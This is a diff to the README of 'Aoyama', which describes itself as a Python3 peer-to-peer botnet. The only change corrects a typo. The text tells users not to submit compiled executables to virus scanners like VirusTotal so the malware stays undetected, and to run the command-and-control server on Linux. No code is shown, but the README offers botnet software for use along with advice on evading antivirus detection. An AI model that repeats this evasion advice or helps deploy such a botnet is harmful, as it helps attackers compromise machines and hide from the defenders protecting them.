@@ -1,7 +1,7 @@
 # Aoyama
 A New version of Python3 P2P botnet, old version: http://github.com/Leeon123/Python3-botnet
 
-***PLS Don't scan the executable file generated from pyinstaller or py2exe in any virtus scanner(such as VirusTotal), if you want to keep using this project(i will continue update the code) and not be detected*** 
+***PLS Don't scan the executable file generated from pyinstaller or py2exe in any virus scanner(such as VirusTotal), if you want to keep using this project(i will continue update the code) and not be detected*** 
 
 **Plese run the cnc.py in linux, run in windows will have bug when login to cnc(idk why but i will try to fix it)**
 ## News&Features
